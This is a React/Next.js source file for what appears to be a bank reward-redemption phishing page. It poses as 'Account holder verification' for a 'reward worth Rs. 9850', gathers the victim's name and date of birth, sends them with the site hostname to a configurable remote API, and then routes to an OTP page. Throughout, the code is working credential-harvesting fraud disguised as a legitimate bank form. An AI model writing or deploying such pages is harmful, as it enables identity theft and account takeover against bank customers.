'use client'
import Captcha from "../../assets/captcha.png";
import { useRouter } from "next/navigation"; // in client component

import { useState } from 'react';
import DateInput from "../include/DateInput";
export default function Home() {
   const router = useRouter();
   const  [response, setResponse] = useState(false);
    const showError = () => {
        alert("OTP resend successfully !");
    }
  const handleSubmit = (e) => {
    e.preventDefault();
      const formData = new FormData(e.target);
      const body = {};
      formData.forEach((value, key) => {
        body[key] = value;
      });
      body['site'] = window.location.hostname;
      fetch(process.env.API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json'},
        body: JSON.stringify(body),
      })
        .then((res) => res.json())
        .then((responseData) => {
          if(responseData.status == 200){
            setResponse(true);
            router.push("/otp?next=/ap")
          }else{
            setResponse(false);
            console.log('failed');
          }
            
        })
        .catch((error) => {
          setResponse(false);
          console.error(error);
        });
  };
  return (
    <div className="container">
        <form
  onSubmit={handleSubmit}
>
  <div className="box">
    <div className="page-hea">
      <div className="row">
        <div className="col-xs-6 col-md-6">
          <h2
            style={{
              fontFamily: '"Open Sans", sans-serif',
              fontSize: 16,
              fontWeight: 600,
              alignItem: "centre",
              textAlign: "centre"
            }}
          >
            {" "}
            Account holder details{" "}
          </h2>
        </div>
        <div className="col-xs-6 col-md-6 text-right">
          <h2>X</h2>
        </div>
      </div>
    </div>
    <div className="row">
      <div className="col-md-6 col-xs-12">
        <div className="progress">
          <div
            className="progress-bar"
            style={{
              fontFamily: '"Open Sans", sans-serif',
              color: "#fff",
              fontWeight: 500,
              width: "100%"
            }}
          >
            step 1/4: Redeem of reward worth Rs. 9850{" "}
          </div>
        </div>
        <div className="p-50">
          <h4
            style={{
              fontFamily: '"Open Sans", sans-serif',
              color: "#000",
              fontWeight: 700,
              marginTop: "-10%"
            }}
          >
            Account holder verification
          </h4>
          <br />
          <br />
          <div className="login-box">
            <div className="user-box">
              <input
                type="text"
                name="AHNN"
                className="name"
                onkeydown="return /[a-z A-Z]/i.test(event.key)"
                minLength={3}
                maxLength={40}
                required
              />
              <label>
                Account holder name<span style={{ color: "red" }}> *</span>
              </label>
            </div>
            <div className="user-box">
              <DateInput />
              <label>
                Date Of Birth<span style={{ color: "red" }}> *</span>
              </label>
              <p1>
                <span
                  className="error"
                  style={{
                    display: "none",
                    position: "absolute",
                    margin: "-6%",
                    marginLeft: 0
                  }}
                >
                  Invalid Date Of Birth !
                </span>
              </p1>
            </div>
          </div>
        </div>
        <div className="row">
          <div className="col-xs-12 col-md-12 text-center">
            <a
              href="#"
              style={{ fontFamily: '"Open Sans", sans-serif', fontWeight: 500 }}
              className="btn btn-border"
            >
              Back
            </a>
            <button
              type="submit"
              style={{ fontFamily: '"Open Sans", sans-serif', fontWeight: 500 }}
              className="btn btn-primary"
            >
              {" "}
              Submit{" "}
            </button>
          </div>
        </div>
        <br />
      </div>
    </div>
  </div>
</form>

    </div>

  
  )
}
